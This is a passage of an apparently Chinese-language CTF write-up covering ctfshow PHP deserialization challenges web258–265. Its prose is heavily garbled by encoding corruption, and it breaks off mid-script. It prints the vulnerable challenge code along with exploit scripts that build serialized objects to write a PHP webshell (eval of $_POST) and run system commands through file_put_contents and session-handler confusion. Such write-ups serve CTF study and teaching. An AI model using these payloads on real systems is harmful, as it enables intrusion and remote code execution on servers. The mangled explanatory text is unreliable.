class="line">/`[oc]:\d+:/iæ„æ€å°±æ˜¯ä¸èƒ½å‡ºç°O:æ•°å­—ï¼Œæˆ‘ä»¬ç”¨<span class="number">0</span>:+æ•°å­—å³å¯ç»•è¿‡ã€‚`</span><br><span class="line">[oc]: å°±æ˜¯æ­£åˆ™åŒ¹é…çš„æ„æ€</span><br><span class="line">\d:  åŒ¹é…ä¸€ä¸ªæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äº [<span class="number">0</span>-<span class="number">9</span>]ã€‚</span><br><span class="line"> +:  åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œ<span class="string">&#x27;zo+&#x27;</span> èƒ½åŒ¹é… <span class="string">&quot;zo&quot;</span> ä»¥åŠ <span class="string">&quot;zoo&quot;</span>ï¼Œä½†ä¸èƒ½åŒ¹é… <span class="string">&quot;z&quot;</span>ã€‚+ ç­‰ä»·äº &#123;<span class="number">1</span>,&#125;ã€‚</span><br><span class="line">/i:  è¡¨ç¤ºåŒ¹é…çš„æ—¶å€™ä¸åŒºåˆ†å¤§å°å†™</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å› æ­¤å’Œä¸Šä¸€é¢˜çš„æ„é€ ç›¸ä¼¼ï¼Œä½†æ˜¯è¦å°†æ„é€ å¥½çš„åºåˆ—åŒ–ä¸­çš„O:æ•°å­—å˜ä¸ºO:+æ•°å­—ã€‚</p><h2 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h2><p>ä¸å¤ªä¼šï¼Œä¹‹åè¡¥ä¸Š<br>å¤§ä½¬çš„åšæ³•ï¼š<a href="https://y4tacker.blog.csdn.net/article/details/110521104">Y4tacker</a></p><blockquote><p>array_popï¼ˆarrayï¼‰ï¼šè¯¥å‡½æ•°æ˜¯å°†æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ åˆ é™¤ã€‚</p></blockquote><p>æœ¬é¢˜éœ€è¦æ„é€ POSTè¯·æ±‚å¤´ä½¿å¾—ä½¿å¾—<br>token=ctfshow<br>ä»è€Œå°†flagæ”¾å…¥åˆ°flag.txtä¸­<br>åˆ©ç”¨<br>Soapclientï¼ˆï¼‰å‡½æ•°æ„é€ è¯·æ±‚å¤´ã€‚</p><h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,serialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»ä¸­å¯ä»¥çœ‹å‡ºéœ€è¦æ„é€ çš„popé“¾æ¡ä¸­è¦åŒ…å«â€™ctfshow_i_love_36Dâ€˜ï¼Œå› æ­¤æ„é€ ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;ctfshow_i_love_36D&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> ctfshow());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><p>file_put_contents() å‡½æ•°ç”¨äºæŠŠå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ï¼ŒæˆåŠŸè¿”å›å†™å…¥åˆ°æ–‡ä»¶å†…æ•°æ®çš„å­—èŠ‚æ•°ï¼Œå¤±è´¥åˆ™è¿”å› FALSE<br>ä¾‹å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> file_put_contents(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;This is something.&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="keyword">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = <span class="keyword">$this</span>-&gt;username.<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            file_put_contents(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæˆ‘ä»¬æœ‰ä¸¤ä¸ªåˆ©ç”¨ç‚¹ï¼Œç”±äº__invoke()åœ¨é¢˜ä¸­æ ¹æœ¬æ²¡æœ‰ä½¿ç”¨ï¼Œæ‰€ä»¥åªèƒ½ç”¨__destruct()è¿™ä¸ªæ–¹æ³•ã€‚åˆ©ç”¨file_put_contents()å‡½æ•°å†™å‡ºphpæ–‡ä»¶å¹¶è®¿é—®ã€‚å½“ç„¶ä¼ å…¥çš„å‚æ•°ä¹Ÿè¦æ˜¯popé“¾ï¼Œå› æ­¤è¿›è¡Œä»¥ä¸‹æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="string">&#x27;877.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="string">&quot;&lt;?php eval(system(&#x27;tac /fl*&#x27;)); ?&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> ctfshowvip());</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h2><p><a href="https://blog.csdn.net/weixin_45669205/article/details/114163197">ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</a><br><a href="https://blog.csdn.net/qq_43431158/article/details/108210822?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163567204116780271573129%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163567204116780271573129&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-108210822.pc_search_all_es&utm_term=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8&spm=1018.2226.3001.4187">ååºåˆ—åŒ–é€ƒé€¸</a><br>ä¸€äº›å°çŸ¥è¯†ï¼š<br>setcookie(name,value,expire,path,domain,secure)<br>å‚æ•°    æè¿°<br>name    å¿…éœ€ã€‚è§„å®š cookie çš„åç§°ã€‚<br>value    å¿…éœ€ã€‚è§„å®š cookie çš„å€¼ã€‚<br>expire    å¯é€‰ã€‚è§„å®š cookie çš„æœ‰æ•ˆæœŸã€‚<br>path    å¯é€‰ã€‚è§„å®š cookie çš„æœåŠ¡å™¨è·¯å¾„ã€‚<br>domain    å¯é€‰ã€‚è§„å®š cookie çš„åŸŸåã€‚<br>secure    å¯é€‰ã€‚è§„å®šæ˜¯å¦é€šè¿‡å®‰å…¨çš„ HTTPS è¿æ¥æ¥ä¼ è¾“ cookieã€‚</p><p>æœ¬é¢˜ä¸­é€šè¿‡setcookieè®©æœåŠ¡å™¨é€šè¿‡cookieå‘é€nameå€¼ï¼Œä¹‹ååœ¨é€šè¿‡$_COOKIEè¿™ä¸ªé­”æœ¯å˜é‡æ¥æ”¶é”®ä¸ºnameçš„å€¼ã€‚</p><h2 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h2><p>å­˜åœ¨<a href="http://www.zip,æŠŠä»£ç ä¸‹è½½ä¸‹æ¥è¿›è¡Œå®¡è®¡./">www.zipï¼ŒæŠŠä»£ç ä¸‹è½½ä¸‹æ¥è¿›è¡Œå®¡è®¡ã€‚</a><br>åœ¨inc.phpé‚£é‡Œå‘ç°è¿™ä¸ªï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="comment">//è¿˜æœ‰ä¸€ç§æ˜¯ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ååº”è‚¯å®šå°±æ˜¯sessionååºåˆ—åŒ–äº†ï¼Œè¿™é‡ŒæŠŠsessionçš„session.serialize_handlerè®¾ç½®ä¸ºphpï¼Œæš—ç¤ºäº†é»˜è®¤çš„php.inié‡Œé¢çš„è‚¯å®šä¸æ˜¯phpï¼Œå¤§æ¦‚ç‡æ˜¯php_serializeã€‚æ—¢ç„¶sessionåºåˆ—åŒ–å­˜å‚¨çš„å¼•æ“å­˜åœ¨å·®å¼‚ï¼Œè‡ªç„¶å¯ä»¥è¿›è¡Œæ”»å‡»äº†ï¼š</p><blockquote><p>å½“ä¼šè¯è‡ªåŠ¨å¼€å§‹æˆ–è€…é€šè¿‡ session_start() æ‰‹åŠ¨å¼€å§‹çš„æ—¶å€™ï¼Œ PHP å†…éƒ¨ä¼šè°ƒç”¨ä¼šè¯ç®¡ç†å™¨çš„ open å’Œ read å›è°ƒå‡½æ•°ã€‚<br>ä¼šè¯ç®¡ç†å™¨å¯èƒ½æ˜¯ PHP é»˜è®¤çš„ï¼Œ ä¹Ÿå¯èƒ½æ˜¯æ‰©å±•æä¾›çš„ï¼ˆSQLite æˆ–è€… Memcached æ‰©å±•ï¼‰ï¼Œ ä¹Ÿå¯èƒ½æ˜¯é€šè¿‡<br>session_set_save_handler() è®¾å®šçš„ç”¨æˆ·è‡ªå®šä¹‰ä¼šè¯ç®¡ç†å™¨ã€‚ é€šè¿‡ read<br>å›è°ƒå‡½æ•°è¿”å›çš„ç°æœ‰ä¼šè¯æ•°æ®ï¼ˆä½¿ç”¨ç‰¹æ®Šçš„åºåˆ—åŒ–æ ¼å¼å­˜å‚¨ï¼‰ï¼ŒPHP ä¼šè‡ªåŠ¨ååºåˆ—åŒ–æ•°æ®å¹¶ä¸”å¡«å…… $_SESSION è¶…çº§å…¨å±€å˜é‡</p></blockquote><p>å…ˆåˆ¤æ–­ä¸€ä¸‹sessionæ˜¯å¦å¯æ§ã€‚å¦‚æœä¸å¯æ§çš„è¯å¯èƒ½å°±è¦åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ äº†ã€‚<br>å…¨å±€æœç´¢ä¸€ä¸‹sessionï¼Œå‘ç°é¦–å…ˆæ˜¯è¿™é‡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> setcookie(<span class="string">&quot;limit&quot;</span>,base64_encode(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line"> <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡è®¿é—®index.phpå°±ä¼šäº§ç”Ÿsessionï¼Œä¹‹åå¦‚æœlimitæ²¡è¶…è¿‡5çš„è¯ï¼Œ$_SESSION[â€˜limitâ€™]=base64_decode($_COOKIE[â€˜limitâ€™]);<br>Cookieå¯æ§ï¼Œå› æ­¤sessionå°±å¯æ§äº†ã€‚å†å»æ‰¾ä¸€ä¸‹åˆ©ç”¨ç‚¹ï¼Œç›´æ¥æ‰¾session_startï¼Œå‘ç°inc.phpé‡Œé¢æœ‰session-start()ï¼Œè€Œä¸”å­˜åœ¨Userç±»ï¼Œæœ‰ä¸€ä¸ªæ–‡ä»¶å†™å…¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">&quot;log-&quot;</span>.<span class="keyword">$this</span>-&gt;username, <span class="string">&quot;ä½¿ç”¨&quot;</span>.<span class="keyword">$this</span>-&gt;password.<span class="string">&quot;ç™»é™†&quot;</span>.(<span class="keyword">$this</span>-&gt;status?<span class="string">&quot;æˆåŠŸ&quot;</span>:<span class="string">&quot;å¤±è´¥&quot;</span>).<span class="string">&quot;----&quot;</span>.date_create()-&gt;format(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ–‡ä»¶åå’Œå†™å…¥çš„å†…å®¹éƒ½å¯æ§ï¼Œå› æ­¤å¯ä»¥å†™é©¬ï¼Œè‡ªæ­¤ååºåˆ—åŒ–é“¾ä¹Ÿå°±ç†é¡ºäº†ã€‚<br>æ„é€ å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> User(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">//$_SESSION[&#x27;user&#x27;]=$user;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&#x27;|&#x27;</span>.serialize(<span class="variable">$user</span>));</span><br><span class="line"><span class="comment">//$s = &#x27;s:4:&quot;user&quot;;O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;1.php&quot;;s:8:&quot;password&quot;;s:34:&quot;<span class="meta">&lt;?php</span> eval($_POST[1]); phpinfo()? &gt;&quot;;s:6:&quot;status&quot;;N;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//var_dump(unserialize($s));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;1.php&quot;;s:8:&quot;password&quot;;s:24:&quot;<span class="meta">&lt;?php</span> eval($_POST[1]);? &gt;&quot;;s:6:&quot;status&quot;;N;&#125; </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆè®¿é—®index.phpï¼Œç„¶åæ”¹cookieï¼Œå†åˆ·æ–°ä¸€æ¬¡index.phpï¼Œå†è®¿é—®ä¸€æ¬¡check.phpï¼Œè¿™æ ·é©¬å°±å†™å¥½äº†ï¼Œç„¶åè®¿é—®log-1.php,å¹¶è¿›è¡Œæ“ä½œã€‚</p><h2 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h2><p>å’Œweb262ç›¸ä¼¼ï¼Œåªä¸è¿‡ä¸€ä¸ªä½¿ç”¨session ä¸€ä¸ªä½¿ç”¨cookie</p><h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;token===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=md5(mt_rand());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;login())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦ç”¨åˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=&amp;<span class="variable">$b</span></span><br><span class="line"><span class="comment">//æŒ‡bçš„å€¼éšaå€¼å‘ç”Ÿå˜åŒ–ï¼Œåªè¦aå˜ï¼Œbå°±è·Ÿç€å˜ã€‚</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡åˆ†æå¯ä»¥çœ‹å‡ºï¼Œåªè¦åœ¨tokenå’Œpasswordä¸€ç›´ä¿æŒç›¸ç­‰ï¼Œå°±å¯ä»¥å¾—åˆ°flag<br>åˆ›é€ è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span 